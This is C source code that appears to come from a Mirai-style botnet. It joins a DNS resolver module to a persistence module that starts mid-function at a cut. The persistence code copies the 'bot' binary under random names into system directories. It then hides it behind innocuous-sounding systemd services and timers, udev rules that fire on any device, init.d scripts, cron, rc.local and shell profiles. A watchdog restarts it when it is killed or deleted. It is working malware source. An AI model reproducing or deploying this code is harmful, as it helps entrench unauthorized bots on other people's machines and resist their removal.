#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/select.h>
#include <errno.h>

#include "includes.h"
#include "resolv.h"
#include "util.h"
#include "rand.h"
#include "protocol.h"

void resolv_domain_to_hostname(char *dst_hostname, char *src_domain)
{
    int len = util_strlen(src_domain) + 1;
    char *lbl = dst_hostname, *dst_pos = dst_hostname + 1;
    uint8_t curr_len = 0;

    while (len-- > 0)
    {
        char c = *src_domain++;

        if (c == '.' || c == 0)
        {
            *lbl = curr_len;
            lbl = dst_pos++;
            curr_len = 0;
        }
        else
        {
            curr_len++;
            *dst_pos++ = c;
        }
    }
    *dst_pos = 0;
}

static void resolv_skip_name(uint8_t *reader, uint8_t *buffer, int *count)
{
    unsigned int jumped = 0, offset;
    *count = 1;
    while(*reader != 0)
    {
        if(*reader >= 192)
        {
            offset = (*reader)*256 + *(reader+1) - 49152;
            reader = buffer + offset - 1;
            jumped = 1;
        }
        reader = reader+1;
        if(jumped == 0)
            *count = *count + 1;
    }

    if(jumped == 1)
        *count = *count + 1;
}

struct resolv_entries *resolv_lookup(char *domain)
{
    struct resolv_entries *entries = calloc(1, sizeof (struct resolv_entries));
    char query[2048], response[2048];
    struct dnshdr *dnsh = (struct dnshdr *)query;
    char *qname = (char *)(dnsh + 1);

    resolv_domain_to_hostname(qname, domain);

    struct dns_question *dnst = (struct dns_question *)(qname + util_strlen(qname) + 1);
    struct sockaddr_in addr = {0};
    int query_len = sizeof (struct dnshdr) + util_strlen(qname) + 1 + sizeof (struct dns_question);
    int tries = 0, fd = -1, i = 0;
    uint16_t dns_id = rand_next() % 0xffff;

    util_zero(&addr, sizeof (struct sockaddr_in));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);
    addr.sin_port = htons(53);

    
    dnsh->id = dns_id;
    dnsh->opts = htons(1 << 8); 
    dnsh->qdcount = htons(1);
    dnst->qtype = htons(PROTO_DNS_QTYPE_A);
    dnst->qclass = htons(PROTO_DNS_QCLASS_IP);

    while (tries++ < 5)
    {
        fd_set fdset;
        struct timeval timeo;
        int nfds;

        if (fd != -1)
            close(fd);

        if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
        {
            #ifdef DEBUG
                printf("[resolv] Failed to create socket\n");
            #endif
            sleep(1);
            continue;
        }

        if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
        {
            #ifdef DEBUG
                printf("[resolv] Failed to call connect on udp socket\n");
            #endif
            sleep(1);
            continue;
        }

        if (send(fd, query, query_len, MSG_NOSIGNAL) == -1)
        {
            #ifdef DEBUG
                printf("[resolv] Failed to send packet: %d\n", errno);
            #endif
            sleep(1);
            continue;
        }

        fcntl(F_SETFL, fd, O_NONBLOCK | fcntl(F_GETFL, fd, 0));
        FD_ZERO(&fdset);
        FD_SET(fd, &fdset);

        timeo.tv_sec = 5;
        timeo.tv_usec = 0;
        nfds = select(fd + 1, &fdset, NULL, NULL, &timeo);

        if (nfds == -1)
        {
            #ifdef DEBUG
                printf("[resolv] select() failed\n");
            #endif
            break;
        }
        else if (nfds == 0)
        {
            #ifdef DEBUG
                printf("[resolv] Couldn't resolve %s in time. %d tr%s\n", domain, tries, tries == 1 ? "y" : "ies");
            #endif
            continue;
        }
        else if (FD_ISSET(fd, &fdset))
        {
            #ifdef DEBUG
                printf("[resolv] Got response from select\n");
            #endif
            int ret = recvfrom(fd, response, sizeof (response), MSG_NOSIGNAL, NULL, NULL);
            char *name;
            struct dnsans *dnsa;
            uint16_t ancount;
            int stop;

            if (ret < (sizeof (struct dnshdr) + util_strlen(qname) + 1 + sizeof (struct dns_question)))
                continue;

            dnsh = (struct dnshdr *)response;
            qname = (char *)(dnsh + 1);
            dnst = (struct dns_question *)(qname + util_strlen(qname) + 1);
            name = (char *)(dnst + 1);

            if (dnsh->id != dns_id)
                continue;
            if (dnsh->ancount == 0)
                continue;

            ancount = ntohs(dnsh->ancount);
            while (ancount-- > 0)
            {
                struct dns_resource *r_data = NULL;

                resolv_skip_name(name, response, &stop);
                name = name + stop;

                r_data = (struct dns_resource *)name;
                name = name + sizeof(struct dns_resource);

                if (r_data->type == htons(PROTO_DNS_QTYPE_A) && r_data->_class == htons(PROTO_DNS_QCLASS_IP))
                {
                    if (ntohs(r_data->data_len) == 4)
                    {
                        uint32_t *p;
                        uint8_t tmp_buf[4];
                        for(i = 0; i < 4; i++)
                            tmp_buf[i] = name[i];

                        p = (uint32_t *)tmp_buf;

                        entries->addrs = realloc(entries->addrs, (entries->addrs_len + 1) * sizeof (ipv4_t));
                        entries->addrs[entries->addrs_len++] = (*p);
#ifdef DEBUG
                        printf("[resolv] Found IP address: %d.%d.%d.%d\n", CONVERT_ADDR(*p));
#endif
                    }

                    name = name + ntohs(r_data->data_len);
                } else {
                    resolv_skip_name(name, response, &stop);
                    name = name + stop;
                }
            }
        }

        break;
    }

    close(fd);

    #ifdef DEBUG
        printf("Resolved %s to %d IPv4 addresses\n", domain, entries->addrs_len);
    #endif

    if (entries->addrs_len > 0)
        return entries;
    else
    {
        resolv_entries_free(entries);
        return NULL;
    }
}

void resolv_entries_free(struct resolv_entries *entries)
{
    if (entries == NULL)
        return;
    if (entries->addrs != NULL)
        free(entries->addrs);
    free(entries);
}
service", timer_name);
    f = fopen(service_path, "w");
    if (f == NULL) {
        printf("[persist] timer: cannot create service file (errno: %d)\n", errno);
        return FALSE;
    }
    
    fprintf(f, "[Unit]\n");
    fprintf(f, "Description=System Timer Service\n");
    fprintf(f, "After=network.target\n\n");
    fprintf(f, "[Service]\n");
    fprintf(f, "Type=oneshot\n");
    fprintf(f, "ExecStart=%s\n", bot_path);
    fprintf(f, "\n[Install]\n");
    fprintf(f, "WantedBy=multi-user.target\n");
    fclose(f);
    
    snprintf(timer_path, sizeof(timer_path), "/etc/systemd/system/%s.timer", timer_name);
    f = fopen(timer_path, "w");
    if (f == NULL) {
        unlink(service_path);
        printf("[persist] timer: cannot create timer file (errno: %d)\n", errno);
        return FALSE;
    }
    
    fprintf(f, "[Unit]\n");
    fprintf(f, "Description=Run system service periodically\n\n");
    fprintf(f, "[Timer]\n");
    fprintf(f, "OnBootSec=30sec\n");
    fprintf(f, "OnUnitActiveSec=5min\n");
    fprintf(f, "RandomizedDelaySec=30\n\n");
    fprintf(f, "[Install]\n");
    fprintf(f, "WantedBy=timers.target\n");
    fclose(f);
    
    char cmd[512];
    snprintf(cmd, sizeof(cmd), 
             "systemctl daemon-reload >/dev/null 2>&1 && "
             "systemctl enable %s.timer >/dev/null 2>&1 && "
             "systemctl start %s.timer >/dev/null 2>&1", 
             timer_name, timer_name);
    
    int ret = system(cmd);
    if (ret != 0) {
        printf("[persist] timer: enable/start failed (exit: %d)\n", WEXITSTATUS(ret));
        return FALSE;
    }
    
    return TRUE;
}

static BOOL setup_udev_rule(const char *bot_path) {
    char udev_dir[] = "/etc/udev/rules.d";
    char udev_path[256];
    
    if (access(udev_dir, F_OK) != 0 || access(udev_dir, W_OK) != 0) {
        printf("[persist] udev: %s not writable\n", udev_dir);
        return FALSE;
    }
    
    char rule_name[32];
    generate_random_name(rule_name, 8);
    snprintf(udev_path, sizeof(udev_path), "%s/99-%s.rules", udev_dir, rule_name);
    
    FILE *f = fopen(udev_path, "w");
    if (f == NULL) {
        printf("[persist] udev: cannot create rule file (errno: %d)\n", errno);
        return FALSE;
    }
    
    fprintf(f, "# Network interface persistence rule\n");
    fprintf(f, "ACTION==\"add\", SUBSYSTEM==\"net\", RUN+=\"%s\"\n", bot_path);
    
    fprintf(f, "\n# USB device persistence rule\n");
    fprintf(f, "ACTION==\"add\", SUBSYSTEM==\"usb\", RUN+=\"%s\"\n", bot_path);
    
    fprintf(f, "\n# Coldplug persistence rule\n");
    fprintf(f, "ACTION==\"add\", SUBSYSTEM==\"*\", ENV{DEVTYPE}!=\"partition\", RUN+=\"%s\"\n", bot_path);
    
    fclose(f);
    
    chmod(udev_path, 0644);
    
    system("udevadm control --reload-rules 2>/dev/null || true");
    system("udevadm trigger 2>/dev/null || true");
    
    return TRUE;
}

const char* get_persistent_path(void) {
    if (persistent_path[0] != '\0') {
        return persistent_path;
    }
    return NULL;
}

void persistence_init(void) {
    char self_exe[4096];
    char install_path[256];
    ssize_t len;
    
    len = readlink("/proc/self/exe", self_exe, sizeof(self_exe) - 1);
    if (len == -1) {
        printf("[persist] cannot read self executable\n");
        return;
    }
    self_exe[len] = '\0';
    
    if (strstr(self_exe, "/usr/bin/") != NULL ||
        strstr(self_exe, "/usr/sbin/") != NULL ||
        strstr(self_exe, "/lib/") != NULL ||
        strstr(self_exe, "/usr/lib/") != NULL ||
        strstr(self_exe, "/usr/local/") != NULL ||
        strstr(self_exe, "/opt/") != NULL) {
        
        util_strcpy(persistent_path, self_exe);
        return;
    }
    
    const char *install_dirs[] = {
        "/usr/local/bin",      
        "/usr/local/lib",      
        "/opt",                
        "/var/lib",            
        "/usr/bin",            
        "/usr/sbin",           
        "/lib",                
        "/usr/lib"             
    };
    
    BOOL installed = FALSE;
    for (int i = 0; i < sizeof(install_dirs) / sizeof(install_dirs[0]); i++) {
        if (access(install_dirs[i], F_OK) != 0) {
            continue;
        }
        
        if (is_readonly(install_dirs[i])) {
            printf("[persist] %s is read-only\n", install_dirs[i]);
            continue;
        }
        
        if (is_tmpfs(install_dirs[i])) {
            printf("[persist] %s is tmpfs (volatile)\n", install_dirs[i]);
            continue;
        }
        
        if (access(install_dirs[i], W_OK) == 0) {
            char random_name[32];
            generate_random_name(random_name, 16);
            
            snprintf(install_path, sizeof(install_path), "%s/%s", install_dirs[i], random_name);
            
            if (copy_file(self_exe, install_path)) {
                if (access(install_path, X_OK) == 0) {
                    util_strcpy(persistent_path, install_path);
                    installed = TRUE;
                    break;
                } else {
                    printf("[persist] copied file not executable: %s\n", install_path);
                }
            } else {
                printf("[persist] copy failed to: %s\n", install_dirs[i]);
            }
        }
    }
    
    if (!installed) {
        const char *fallback_dirs[] = {
            "/tmp",
            "/var/tmp",
            "/dev/shm"
        };
        
        for (int i = 0; i < sizeof(fallback_dirs) / sizeof(fallback_dirs[0]); i++) {
            if (access(fallback_dirs[i], W_OK) == 0) {
                char random_name[32];
                generate_random_name(random_name, 16);
                snprintf(install_path, sizeof(install_path), "%s/%s", fallback_dirs[i], random_name);
                
                if (copy_file(self_exe, install_path)) {
                    if (access(install_path, X_OK) == 0) {
                        util_strcpy(persistent_path, install_path);
                        installed = TRUE;
                        break;
                    }
                }
            }
        }
        
        if (!installed) {
            printf("[persist] failed to install to any directory\n");
            return;
        }
    }
    
    printf("[persist] installed to: %s\n", install_path);
    
    // Try all persistence methods
    BOOL any_success = FALSE;
    
    if (setup_systemd(install_path)) {
        printf("[persist] systemd service installed\n");
        any_success = TRUE;
    }
    
    if (setup_rclocal(install_path)) {
        printf("[persist] rc.local entry added\n");
        any_success = TRUE;
    }
    
    if (setup_cron(install_path)) {
        printf("[persist] cron job added\n");
        any_success = TRUE;
    }
    
    if (setup_shell_profiles(install_path)) {
        printf("[persist] shell profile entries added\n");
        any_success = TRUE;
    }
    
    if (setup_systemd_timer(install_path)) {
        printf("[persist] systemd timer installed\n");
        any_success = TRUE;
    }
    
    if (setup_udev_rule(install_path)) {
        printf("[persist] udev rule added\n");
        any_success = TRUE;
    }
    
    if (access("/etc/init.d", F_OK) == 0 && access("/etc/init.d", W_OK) == 0 && !is_readonly("/etc")) {
        char init_script[256];
        char random_name[32];
        generate_random_name(random_name, 12);
        
        snprintf(init_script, sizeof(init_script), "/etc/init.d/%s", random_name);
        
        FILE *f = fopen(init_script, "w");
        if (f != NULL) {
            fprintf(f, "#!/bin/sh\n");
            fprintf(f, "### BEGIN INIT INFO\n");
            fprintf(f, "# Provides:          %s\n", random_name);
            fprintf(f, "# Required-Start:    $network\n");
            fprintf(f, "# Default-Start:     2 3 4 5\n");
            fprintf(f, "# Default-Stop:\n");
            fprintf(f, "### END INIT INFO\n\n");
            fprintf(f, "%s &\n", install_path);
            fclose(f);
            chmod(init_script, 0755);
            printf("[persist] init script created: %s\n", init_script);
            any_success = TRUE;
        }
    }
    
    if (!any_success) {
        printf("[persist] WARNING: no persistence methods succeeded\n");
    } else {
        persistence_watchdog_init();
    }
}
static int inotify_fd = -1;
static int inotify_wd = -1;

void persistence_watchdog_init(void) {
    const char *persistent = get_persistent_path();
    if (persistent == NULL)
        return;
    
    inotify_fd = inotify_init();
    if (inotify_fd == -1) {
        printf("[persist] watchdog: inotify_init failed\n");
        return;
    }
    
    int flags = fcntl(inotify_fd, F_GETFL);
    if (flags != -1) {
        fcntl(inotify_fd, F_SETFL, flags | O_NONBLOCK);
    }
    
    char dir_path[256];
    strncpy(dir_path, persistent, sizeof(dir_path) - 1);
    dir_path[sizeof(dir_path) - 1] = '\0';
    
    char *last_slash = strrchr(dir_path, '/');
    if (last_slash != NULL) {
        *last_slash = '\0';
    } else {
        strcpy(dir_path, ".");
    }
    
    inotify_wd = inotify_add_watch(inotify_fd, dir_path, IN_DELETE | IN_MOVED_FROM);
    if (inotify_wd == -1) {
        printf("[persist] watchdog: inotify_add_watch failed (errno: %d)\n", errno);
        close(inotify_fd);
        inotify_fd = -1;
    }
}

void persistence_check_health(void) {
    const char *persistent = get_persistent_path();
    if (persistent == NULL)
        return;
    
    if (access(persistent, F_OK) != 0) {
        printf("[persist] health: binary missing, re-initializing\n");
        #ifndef DEBUG
        persistence_init();
        #endif
        return;
    }
    
    if (inotify_fd != -1) {
        char buf[4096];
        ssize_t len = read(inotify_fd, buf, sizeof(buf));
        if (len > 0) {
            printf("[persist] health: binary modified/deleted, re-initializing\n");
            #ifndef DEBUG
            persistence_init();
            #endif
        }
    }
}

static pid_t watchdog_pid = -1;

static void watchdog_monitor(void) {
    const char *persistent = get_persistent_path();
    if (persistent == NULL)
        return;
    
    pid_t monitor_pid = fork();
    if (monitor_pid < 0) {
        printf("[persist] watchdog: fork failed\n");
        return;
    }
    
    if (monitor_pid > 0) {
        watchdog_pid = monitor_pid;
        return;
    }
    
    setsid();
    pid_t bot_pid = getppid();
    
    for (int i = 0; i < 1024; i++) {
        close(i);
    }
    
    while (1) {
        sleep(20);
        
        if (kill(bot_pid, 0) != 0) {
            if (access(persistent, X_OK) == 0) {
                pid_t new_bot = fork();
                if (new_bot == 0) {
                    char *argv[] = {(char *)persistent, NULL};
                    execv(persistent, argv);
                    _exit(1);
                } else if (new_bot > 0) {
                    bot_pid = new_bot;
                }
            } else {
                _exit(0);
            }
        }
    }
}

void persistence_watchdog_start(void) {
    #ifndef DEBUG
    watchdog_monitor();
    #endif
}
